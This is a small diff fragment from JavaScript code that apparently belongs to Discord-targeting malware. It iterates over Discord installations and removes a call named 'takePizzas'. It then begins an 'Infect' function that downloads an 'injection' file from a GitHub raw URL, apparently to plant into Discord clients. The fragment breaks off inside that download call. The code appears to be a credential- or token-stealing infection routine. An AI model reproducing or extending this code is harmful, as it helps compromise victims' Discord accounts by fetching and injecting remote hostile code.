@@ -41,7 +41,7 @@ discords.forEach(function(file) {
     })
     
 });
-takePizzas();
+
 listDiscords();
 function Infect() {
     https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection', (resp) => {
